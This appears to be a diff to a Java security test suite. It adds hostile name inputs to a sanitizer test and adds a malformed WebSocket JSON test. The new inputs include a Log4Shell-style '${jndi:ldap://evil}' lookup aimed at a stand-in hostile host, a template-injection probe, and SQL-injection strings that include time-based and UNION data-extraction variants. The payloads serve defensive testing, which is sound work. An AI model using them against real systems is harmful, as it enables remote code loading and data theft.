@@ -21,11 +21,17 @@ class SecurityHardeningTest {
         "javascript:alert(1)",
         "Robert'); DROP TABLE players;--",
         "' OR '1'='1",
-        "\" onmouseover=\"alert(1)"
+        "\" onmouseover=\"alert(1)",
+        "{{7*7}}",
+        "${jndi:ldap://evil}",
+        "admin'--",
+        "1;WAITFOR DELAY '0:0:9'",
+        " UNION SELECT email FROM users--",
+        "admin\" OR \"\"=\""
     })
     void hostileNamesAreNeutralized(String payload) {
         String safe = NameSanitizer.sanitize(payload);
-        assertTrue(!safe.contains("<") && !safe.contains(">") && !safe.contains("'"),
+        assertTrue(!safe.contains("<") && !safe.contains(">") && !safe.contains("'") && !safe.contains(";"),
             "Hostile characters must not survive sanitization: " + safe);
     }
 
@@ -37,6 +43,21 @@ class SecurityHardeningTest {
             return;
         }
         throw new AssertionError("Malformed JSON should not parse silently");
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {"{", "}", "{\"a\":}", "null", "[", "{\"type\":}", "{\"type\":", "", "   "})
+    void malformedWebSocketPayloadsNeverParseCleanly(String raw) {
+        boolean parsed;
+        try {
+            Json.readTree(raw);
+            parsed = true;
+        } catch (Exception e) {
+            parsed = false;
+        }
+        // Either it fails to parse, or it parses to something the schema check rejects.
+        assertTrue(!parsed || Json.readTree(raw).path("type").isMissingNode(),
+                "Payload unexpectedly usable: " + raw);
     }
 
     @Test
